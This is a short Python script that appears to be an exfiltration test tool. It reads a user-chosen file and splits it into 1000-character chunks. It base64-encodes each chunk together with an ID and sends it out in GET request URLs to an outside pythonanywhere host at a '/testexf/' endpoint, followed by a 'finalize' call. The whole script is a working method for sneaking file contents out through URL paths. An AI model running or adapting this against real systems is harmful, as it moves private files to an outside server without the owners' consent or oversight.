import base64
import requests
import os

# Constants
SERVER_URL = "https://shkgiri.pythonanywhere.com/testexf/"
FINALIZE_URL = "https://shkgiri.pythonanywhere.com/finalize/"
CHUNK_SIZE = 1000  # characters per chunk (not bytes)

def encode_and_send(file_path, unique_id):
    if not os.path.exists(file_path):
        print("File does not exist.")
        return

    with open(file_path, 'r') as file:
        content = file.read()

    chunks = [content[i:i + CHUNK_SIZE] for i in range(0, len(content), CHUNK_SIZE)]

    for i, chunk in enumerate(chunks):
        data = f"{unique_id}:{chunk}"
        encoded = base64.urlsafe_b64encode(data.encode()).decode()
        try:
            response = requests.get(SERVER_URL + encoded)
            print(f"Chunk {i+1}/{len(chunks)} sent. Status: {response.status_code}")
        except Exception as e:
            print(f"Failed to send chunk {i+1}: {e}")

    # Finalize
    finalize_response = requests.get(FINALIZE_URL + unique_id)
    print(f"Finalize Status: {finalize_response.status_code} - {finalize_response.text}")

if __name__ == "__main__":
    file_path = input("Enter the file path to send: ").strip()
    unique_id = input("Enter a unique ID for this file: ").strip()
    encode_and_send(file_path, unique_id)
